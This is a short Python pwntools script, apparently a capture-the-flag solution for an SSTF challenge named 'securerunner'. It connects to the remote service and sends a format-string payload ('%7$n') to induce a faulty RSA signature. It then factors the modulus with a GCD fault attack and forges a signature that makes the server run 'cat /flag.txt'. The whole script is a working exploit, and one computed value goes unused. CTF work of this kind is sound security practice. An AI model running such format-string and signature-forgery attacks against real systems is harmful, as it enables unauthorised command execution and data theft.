from Crypto.Util.number import *
from pwn import *

r = remote('securerunner.sstf.site', 1337)

r.sendlineafter(b'> ', b'2')
r.recvuntil(b'n = ')
n = int(r.recvline().strip().decode())
r.recvuntil(b'e = ')
e = int(r.recvline().strip().decode())

r.sendlineafter(b'> ', b'1')
r.sendlineafter(b'> ', b'0')

r.sendlineafter(b'> ', b'3')
r.recvuntil(b'sign = ')
s = int(r.recvline().strip().decode())

r.sendlineafter(b'> ', b'9999')
r.sendline(b'-1088\n%7$n')
r.sendlineafter(b'> ', b'3')
r.recvuntil(b'sign = ')
s2 = int(r.recvline().strip().decode())

v = bytes_to_long(b'ls -la /')
p = GCD(pow(s2, e, n) - pow(s, e, n), n)
assert n % p == 0
q = n // p
phi = (p - 1) * (q - 1)
d = inverse(e, phi)

cmd = b'cat /flag.txt'
res = pow(bytes_to_long(cmd), d, n)

r.sendlineafter(b'> ', b'4')
r.sendlineafter(b'> ', cmd)
r.sendlineafter(b'> ', str(res).encode())

r.interactive()